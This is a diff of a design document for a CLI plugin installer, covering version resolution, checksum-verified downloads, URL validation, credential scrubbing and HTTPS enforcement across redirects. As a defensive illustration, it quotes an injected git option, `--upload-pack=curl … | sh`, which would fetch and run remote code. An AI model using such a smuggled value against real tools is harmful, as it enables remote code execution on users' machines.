@@ -40,10 +40,12 @@ The CLI prepends this directory to `$PATH` at startup via `cli.PrependPluginBinD
 
 Remote installs are deliberately forge-agnostic:
 
-1. **Version resolution** uses `git ls-remote --tags` — identical on GitHub, GitLab, Gitea/Forgejo, and self-hosted servers; inherits the user's git auth and proxy config. The highest semver tag wins; `--pin <tag>` installs exactly that tag and marks the manifest pinned (skipped by `upgrade`).
+1. **Version resolution** uses `git ls-remote --tags` — identical on GitHub, GitLab, Gitea/Forgejo, and self-hosted servers; inherits the user's git auth and proxy config. The highest **stable** semver tag wins; `--pin <tag>` installs exactly that tag and marks the manifest pinned (skipped by `upgrade`).
+
+   Prereleases are excluded from resolution. semver ranks `v2.0.0-rc1` above stable `v1.9.0`, so listing them would move every user onto a release candidate on the next `plugin upgrade --all` the moment an author pushed one. `--pin` is the opt-in, since it bypasses listing entirely. Every git subprocess also carries a two-minute deadline — the root context is cancellable but has no timeout, so an unreachable host would otherwise hang the command with no output, which matters most during dependency planning against author-controlled URLs.
 2. **Metadata** is read from `entire-plugin.yml` at the repo root via a blobless shallow clone (with a plain shallow-clone fallback for servers that don't allow partial-clone filters). The file is optional; without it the plugin name derives from the repo basename (`entire-run` → `run`).
 3. **Asset download** is the one forge-specific step, contained in a small URL-convention table: GitHub/Gitea-style `<repo>/releases/download/<tag>/<asset>`, GitLab-style `<repo>/-/releases/<tag>/downloads/<asset>`, unknown hosts default to GitHub-style. Authors on other hosts declare a `download_url` template in `entire-plugin.yml` (placeholders: `{name}` `{tag}` `{version}` `{os}` `{arch}` `{asset}`).
-4. **Asset selection** goes through the release's `checksums.txt`: the manifest lists what was actually published, and the download is verified against it. Candidate names follow goreleaser conventions (`entire-<name>_<version>_<os>_<arch>.tar.gz` and friends, with `x86_64`/`aarch64` aliases and a `darwin_all` universal-binary fallback). A pushed tag with no published assets falls back to the next-highest tag with a warning.
+4. **Asset selection** goes through the release's `checksums.txt`: the manifest lists what was actually published, and the download is verified against it. Candidate names follow goreleaser conventions (`entire-<name>_<version>_<os>_<arch>.tar.gz` and friends, with `x86_64`/`aarch64` aliases and a `darwin_all` universal-binary fallback (`all` occupies the *arch* slot, which is where goreleaser puts it)). A pushed tag with no published assets falls back to the next-highest tag with a warning.
 5. The binary lands in `pkg/<name>/` next to a `manifest.yml` recording provenance (repo URL, tag, asset, asset SHA-256, **binary SHA-256**, verification state, pin state, dependency list), and is linked into `bin/` through the same symlink→hardlink→copy fallback as local installs. The dispatcher never changes.
 
 The two digests are not redundant. `sha256` covers the downloaded asset, which is usually an archive and is discarded with the staging directory — provenance only, nothing left to compare against. `binary_sha256` covers the executable under `pkg/<name>/`, which is what `entire plugin doctor` re-hashes to detect a binary swapped out after install.
@@ -56,15 +58,25 @@ Every repo URL is validated by `validatePluginRepoURL` before it reaches the git
 
 git parses an option-shaped positional as an option, and `--upload-pack=<cmd>` is shell-interpreted — with no positional repository left, it runs against the *ambient* repo's `origin`. So a catalog entry like `--upload-pack=curl … | sh; git-upload-pack` would execute arbitrary commands during an index-resolved install, which by design never prompts. Dependency planning is the tightest path: it inspects `requires[].repo_url` *before* the install confirmation.
 
-Accepted forms are `https://`, `http://`, `ssh://`, `git://`, `file://`, git's `user@host:path` scp-like syntax, and absolute local paths. Anything else — a leading `-`, a bare name, a relative path, git's command-executing `ext::` transport — is rejected. Invalid index entries are dropped like invalid names (one bad row can't take out the catalog); an invalid `requires[].repo_url` fails metadata parsing, surfacing the author's mistake at install time.
+Accepted forms are `https://`, `ssh://`, `file://`, and git's `user@host:path` scp-like syntax. Anything else — a leading `-`, a bare name, a relative or bare absolute path, git's command-executing `ext::` transport — is rejected.
+
+`http://` and `git://` are deliberately absent. Both are unauthenticated and unencrypted, and the catalog fetched over them decides which repositories install *without a confirmation prompt*, so an attacker who can rewrite the transport chooses the binary — strictly worse than the plaintext-asset case below. Bare absolute paths are rejected because `file://` expresses the same thing unambiguously; narrowing a security boundary beats the convenience.
+
+The rule has exactly one definition, `settings.ValidateGitURL`, shared by this check and `plugins.index_url` validation. They previously disagreed about `http://`, `git://`, and absolute paths, so `--index /srv/idx` was accepted while the equivalent committed setting was a hard load failure. Invalid index entries are dropped like invalid names (one bad row can't take out the catalog); an invalid `requires[].repo_url` fails metadata parsing, surfacing the author's mistake at install time.
 
 This mirrors `validatePluginName`, which refuses a leading `-` on names for the same reason. Regression coverage asserts the payload never executes, not merely that the call errors.
+
+#### Credentials never reach logs, output, or disk
+
+A remote may embed credentials (`https://user:token@host/repo`). Every path that prints, logs, or persists a repository or index URL strips the userinfo first, and git's captured stderr is scrubbed for the same pattern. This matters more than usual here: `.entire/logs/` lives inside the user's working tree and is collected wholesale by `entire doctor bundle`, and `manifest.yml` is written mode 0644. Upgrades re-resolve auth through git's credential helpers, which is where it belongs.
 
 #### Downloads must be authenticated, over a transport that can't be rewritten
 
 Two requirements apply to every asset fetch, both enforced at the HTTP boundary so the author-declared `download_url` escape hatch is covered as well as the derived forge URLs:
 
 **HTTPS.** Plaintext HTTP is refused for anything off-machine. This isn't stylistic: the asset and the `checksums.txt` that authenticates it come from the same origin, so an attacker who can rewrite one can rewrite both and checksum verification proves nothing. Loopback (`127.0.0.1`, `::1`, `localhost`) is exempt so `httptest` fixtures and local forge experiments keep working — traffic that never leaves the machine has no network attacker to defend against.
+
+The check runs on **every redirect hop**, via the client's `CheckRedirect`, not just the initial URL. Go's default policy follows up to ten redirects and will happily cross from `https` to `http`, so validating only the entry point left the rule bypassable by any release host with an open redirect — the asset *and* its `checksums.txt` could both arrive in plaintext, which is precisely the outcome the rule exists to prevent.
 
 **A checksum manifest.** A release that publishes an asset but no `checksums.txt` covering the platform is refused by default; installing means making those bytes executable, so it takes an explicit `--allow-unverified`. Two shapes are unverifiable and hit the same gate: a release with no manifest at all, and a `download_url` with no `{asset}` placeholder (every candidate name expands to one fixed URL, so no manifest can be located — add `{asset}` to fix it properly).
 
